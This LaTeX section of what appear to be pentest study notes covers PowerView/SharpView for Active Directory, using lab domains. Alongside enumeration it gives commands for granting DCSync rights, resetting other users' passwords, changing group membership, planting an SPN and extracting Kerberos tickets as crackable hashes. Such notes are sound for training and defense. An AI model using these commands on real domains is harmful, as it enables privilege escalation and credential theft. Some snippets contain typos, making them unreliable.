\section{PowerView / sharpview}
\label{tool:powerview}
\subsection*{Introduction}
\url{https://adsecurity.org/?p=2921}

\url{https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview}

\url{https://nored0x.github.io/red-teaming/active-directory-domain-enumeration-part-1/#local-groups}

\url{https://www.hackingarticles.in/active-directory-enumeration-powerview/}

\href{https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1}{PowerView}
as part of their Empire 4 framework is a replacement of the deprecated \href{https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon}{PowerView}
is a tool written in PowerShell to help gain situational awareness within an AD
environment. Much like BloodHound, it provides a way to identify where users
are logged in on a network, enumerate domain information such as users,
computers, groups, ACLS, trusts, hunt for file shares and passwords, perform
Kerberoasting, and more. It is a highly versatile tool that can provide great
insight into the security posture of the  domain. It requires more manual work
to determine misconfigurations and relationships within the domain than
BloodHound but, when used right, can help us to identify subtle
misconfigurations.

\begin{xltabular}{\linewidth}{|l|X|}
    \hline
    Command &	Description\\
    \hline
Export-PowerViewCSV &	Append results to a CSV file\\
    \hline
ConvertTo-SID &	Convert a User or group name to its SID value\\
    \hline
Add-ObjectACL & \\
\hline
Get-DomainSPNTicket &	Requests the Kerberos ticket for a specified Service
Principal Name (SPN) account\\
    \hline
Domain/LDAP Functions:& \\
    \hline
Get-Domain &	Will return the AD object for the current (or specified)
domain\\
    \hline
Get-DomainController &	Return a list of the Domain Controllers for the
specified domain\\
    \hline
Get-DomainUser &	Will return all users or specific user objects in AD\\
    \hline
Get-DomainComputer &	Will return all computers or specific computer objects
in AD\\
    \hline
Get-DomainGroup &	Will return all groups or specific group objects in AD\\
    \hline
Get-DomainOU &	Search for all or specific OU objects in AD\\
    \hline
Find-InterestingDomainAcl &	Finds object ACLs in the domain with modification
rights set to non-built in objects\\
    \hline
Get-DomainGroupMember &	Will return the members of a specific domain group\\
    \hline
Get-DomainFileServer &	Returns a list of servers likely functioning as file
servers\\
    \hline
Get-DomainDFSShare &	Returns a list of all distributed file systems for the
current (or specified) domain\\
    \hline
GPO Functions: & \\
    \hline
Get-DomainGPO &	Will return all GPOs or specific GPO objects in AD\\
    \hline
Get-DomainPolicy &	Returns the default domain policy or the domain controller
policy for the current domain\\
    \hline
Computer Enumeration Functions: & \\
    \hline
Get-NetLocalGroup &	Enumerates local groups on the local or a remote machine\\
    \hline
Get-NetLocalGroupMember &	Enumerates members of a specific local group\\
    \hline
Get-NetShare &	Returns open shares on the local (or a remote) machine\\
    \hline
Get-NetSession &	Will return session information for the local (or a remote)
machine\\
    \hline
Test-AdminAccess &	Tests if the current user has administrative access to the
local (or a remote) machine\\
    \hline
Threaded 'Meta'-Functions: & \\
    \hline
Find-DomainUserLocation &	Finds machines where specific users are logged in\\
    \hline
Find-DomainShare &	Finds reachable shares on domain machines\\
    \hline
Find-InterestingDomainShareFile &	Searches for files matching specific
criteria on readable shares in the domain\\
    \hline
Find-LocalAdminAccess &	Find machines on the local domain where the current
user has local administrator access\\
    \hline
Domain Trust Functions: & \\
    \hline
Get-DomainTrust &	Returns domain trusts for the current domain or a specified
domain\\
    \hline
Get-ForestTrust &	Returns all forest trusts for the current forest or a
specified forest\\
    \hline
Get-DomainForeignUser &	Enumerates users who are in groups outside of the
user's domain\\
    \hline
Get-DomainForeignGroupMember &	Enumerates groups with users outside of the
group's domain and returns each foreign member\\
    \hline
Get-DomainTrustMapping &	Will enumerate all trusts for the current domain
and any others seen.\\
    \hline
Get-NetGmsa & used to hunt for
\href{https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview}{Group
Managed Service Accounts} \\
    \hline
\end{xltabular}

\subsection*{Enumerating User / groups /trust /local adsmin /SPN}
\label{tool:powerview:enum}

\begin{verbatim}
# get info on LOGIN
Get-DomainUser -Identity SAMAN -Domain FQDN | Select-Object -Property name,
    samaccountname,description,memberof,whencreated,pwdlastset,
    lastlogontimestamp,accountexpires,admincount,userprincipalname,
    serviceprincipalname,useraccountcontrol

# get Group Membership
Get-DomainUser -Identity LOGIN |
    Select samaccountname,objectsid,memberof,useraccountcontrol | 
    fl

# Recursive Group Membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust Enumeration
Get-DomainTrustMapping

# Testing for Local Admin Access
Test-AdminAccess -ComputerName NAME

# Finding Users With SPN Set
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName


# Find users with reversible password encryption

Get-DomainUser -Identity * | 
    ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |
    select samaccountname,useraccountcontrol

# Find alive computers 
Get-NetComputer -Ping
\end{verbatim}


\verb+.\SharpView.exe Get-DomainUser -Iden:etity LOGIN+

\begin{verbatim}
 Get-DomainForeignGroupMember -Domain FQDN
\end{verbatim}

\subsection*{Enumerating ACLs }
\label{tool:powerview:ACL_enum}

\subsubsection*{Find-InterestingDomainAcl}

\begin{verbatim}
# List all ACL TOOOOOOOO LLLLOOOOOOONNNNNG
Find-InterestingDomainAcl
\end{verbatim}

\subsubsection*{Get-DomainObjectACL}
\label{tool:powerview:Get-DomainObjectACL}

\verb+Get-DomainObjectACL+ like \verb+Get-ObjectAcl+ Returns the ACLs
associated with a specific active directory object.
\begin{itemize}
    \item \verb+Identity+ can be:
        \begin{itemize}
            \item a SamAccountName 
            \item a DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local)
            \item a SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108)
            \item a GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201). 
            \item Wildcards \verb+*+
        \end{itemize}
    \item \verb+-ResolveGUIDs+ to resolve GUIDs to names
    \item \verb+-RightsFilter+ A specific set of rights to return ('All',
        'ResetPassword', 'WriteMembers').
\end{itemize}


identity example:
\begin{verbatim}
# Get ACL of a SID
$sid = Convert-NameToSid LOGIN
Get-DomainObjectACL -resolveGUIDs -Identity * | 
    ? {$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -resolveGUIDS -Identity $sid

# GET all ACL
Get-DomainObjectACL  -Identity * 
Get-DomainObjectACL  -Identity "DC=YYY,DC=XXX"
\end{verbatim}

the members of an ACL are :
\begin{itemize}
    \item \verb+ObjectDN+: the object on which the ACL apply
    \item \verb+ObjectAceType+: 
    \item \verb+AceQualifier+: the ACE type (Allow, denie\ldots)
    \item \verb+ActiveDirectoryRights+: (\verb+ExtendedRight+)
\end{itemize}

Exemple of filters:
\begin{verbatim}
Get-ObjectAcl ... "ResolveGUIDs |
  ? { ($_.ObjectAceType -match 'Replication-Get') -and 
      ($_.SecurityIdentifier -match $sid) 
  } |
  select AceQualifier, ObjectDN, ActiveDirectoryRights, 
        SecurityIdentifier, ObjectAceType |
  fl
\end{verbatim}


\subsection*{Enum ACLs associated with a specific active directory object}

\begin{verbatim}
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
    ? { ($_.ObjectAceType -match 'Replication-Get') -and
        ($_.SecurityIdentifier -match $sid) 
    } |
    select AceQualifier, ObjectDN, ActiveDirectoryRights,
        SecurityIdentifier,ObjectAceType `
    fl
\end{verbatim}

\subsection*{}
\label{tool:powerview:Add-ObjectACL}
\begin{verbatim}
Add-ObjectACL -TargetDistinguishedName "dc=dc01,dc=htb,dc=local" 
    -PrincipalIdentity ACCOUNT -Credential $cred -Rights DCSync
\end{verbatim}


\subsection*{Change user password}
\label{tool:powerview:Set-DomainUserPasswword}
If impersonation is needed:
\begin{verbatim}
 $SecPasswd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAI?\SAMAN', $SecPasswd)
\end{verbatim}


\begin{verbatim}
$NewPasswd = ConvertTo-SecureString 'NEW_PASSWORD' -AsPlainText -Force

Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity LOGIN -AccountPassword $NewPasswd -Credential $Cred -Verbose
\end{verbatim}

\subsection*{Add/Remove a user to a group}
\label{tool:powerview:DomainGroupMember}

remplace \verb+Add-DomainGroupMember+ with \verb+Remove-DomainGroupMember+ to
remove
\begin{verbatim}
Get-ADGroup -Identity "GROUP_NAME" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'SAMAN' -Credential $Cred2 -Verbose


Get-ADGroup -Identity "GROUP_NAME" -Properties * | Select MemberName
\end{verbatim}

\subsection*{Modify a property of an AD object}
\label{tool:powerview:Set-DomainObject}

SPNify an account using
\href{https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname}{servicePrincipalName
attibute}:
\begin{verbatim}
Set-DomainObject -Credential $Cred2 -Identity SAMAN `
    -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose


# TO CLEAR
Set-DomainObject -Credential $Cred2 -Identity SAMAN -Clear serviceprincipalname -Verbose
\end{verbatim}




\subsection*{Enumerates members of a specific local group on the local (or remote) machine}
\label{tool:powerview:Get-NetLocalGroupMember}
\begin{verbatim}
Get-NetLocalGroupMember -ComputerName COMPUTER_NAME -GroupName "Remote Desktop Users"
\end{verbatim}

\subsection*{links}
\url{https://powersploit.readthedocs.io/en/latest/}



\subsection*{Domain Trust}
\label{tool:powerview:Get-DomainTrust}

\begin{verbatim}
Get-DomainTrust

Get-DomainTrustMapping
\end{verbatim}


\subsection*{GPO}
\label{tool:powerview:Get-DomainGPO}

\begin{verbatim}
Get-DomainGPO | Select-Object displayname
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
\end{verbatim}


\subsection*{Get a TGS}
\label{tool:powerview:Get-DomainSPNTicket}

\begin{verbatim}
Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat -Credential $cred

Get-DomainUser -SPN * | Get-DomainSPNTicket -Outputformat hashcat | select -exp hash
\end{verbatim}
